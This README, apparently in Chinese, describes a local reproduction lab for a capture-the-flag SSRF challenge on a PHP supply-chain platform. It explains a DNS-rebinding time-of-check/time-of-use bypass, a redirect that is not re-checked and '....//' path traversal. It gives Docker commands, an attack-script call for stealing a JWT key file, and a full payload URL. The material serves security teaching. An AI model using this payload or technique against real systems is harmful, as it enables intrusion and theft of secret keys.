# SupplyLink CTF Lab

> 源码来自 **第四届"数信杯"网络安全大赛 团队线下赛** 的一道实操题（附件 `www.zip`，一套 PHP 供应链协同平台）。本仓库额外提供本地复现实验环境，可完整打通题目的 SSRF 攻击链。

## 目录结构

```
├── source/              # www.zip 原始题目源码（public/ internal/ src/ scripts/ dns/）
├── lab/                 # 选手侧工具：攻击脚本、单步追踪器、原生启停脚本、实验指南
├── Dockerfile + docker/ # Docker 单容器封装（推荐玩法，见下）
└── .github/workflows/   # CI：自动构建、冒烟测试、发布镜像到 GHCR
```

## 一句话概括

基于 TOCTOU 的 SSRF：**check**（校验 URL 时域名解析成公网 IP，顺利放行）与 **use**（实际抓取时同一域名解析成 `127.0.0.1`）之间存在时间差，两次 DNS 解析结果不同——校验看的是"门口"，攻击打的是"屋里"。再借 302 跳转后不重验、`....//` 绕过目录穿越，最终让服务器自己 `include` 任意文件并以 zip 归档回传。

## 本地复现

### 方式一：Docker（推荐，一行命令开打）

单容器封装了全部 4 个组件（rebinding DNS + 门户 A/B + 内网预览服务），DNS Rebinding 完全发生在容器内部——**不需要 sudo、不改宿主机 DNS、不留"断网"后遗症**，Windows / macOS / Linux 通吃。

不 clone 仓库、直接拉预构建镜像（GitHub Actions 自动发布到 GHCR）：

```bash
docker run --rm -p 8000:8000 ghcr.io/zigyr/supplylink-ctf-lab:latest
```

或 clone 后自己构建：

```bash
docker build -t supplylink-ctf-lab .
docker run --rm -p 8000:8000 supplylink-ctf-lab
```

容器启动后会自动完成数据库初始化、flag 投放和 rebinding 自检，看到 `✅ rebinding 工作正常` 即可开打（手动做题直接浏览器开 `http://127.0.0.1:8000`，账号 supplier_demo / Huanyu2026!）：

```bash
# 任务 1：读 /var/flag.txt
python3 lab/attack.py
# 任务 2：偷 /opt/supplylink/config/jwt.key
python3 lab/attack.py "....//....//....//opt/supplylink/config/jwt.key"
```

想换 flag：`docker run --rm -p 8000:8000 -e FLAG='flag{your_own}' ghcr.io/zigyr/supplylink-ctf-lab:latest`（`JWT_KEY` 同理）。也可以 `docker compose up`（非必需，根目录 Dockerfile 单容器即可完整运行）。

### 方式二：原生脚本（适合逐行调试源码）

仓库自带一键实验环境（Linux / macOS），clone 下来 `sudo bash lab/start_lab.sh` 即可开打，完整玩法、单步追踪、排错口诀见 [lab/README.md](lab/README.md)。

## 关键 Payload

```
http://<任意的字符串_p>.cache.rebind.huanyutech.cn:8080/jump.php?url=http%3A%2F%2F127.0.0.1%3A8081%2Fdebug%2Fpreview.php%3Ffile%3D....%2F%2F....%2F%2F....%2F%2Fopt%2Fsupplylink%2Fconfig%2Fjwt.key
```

## 具体详情解读

请参考：https://zigyr.github.io/20261108/%E4%B8%80%E6%AC%A1www.zip%E7%9A%84%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%8E%2520URL%2520%E6%8F%90%E4%BA%A4%E6%A1%86%E5%87%BA%E5%8F%91%EF%BC%8C%E7%9C%8B%E7%9C%8B%2520Payload%2520%E6%98%AF%E5%A6%82%E4%BD%95%E6%8A%B5%E8%BE%BE%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E7%9A%84/

> 仅供学习与研究，请勿用于真实目标。
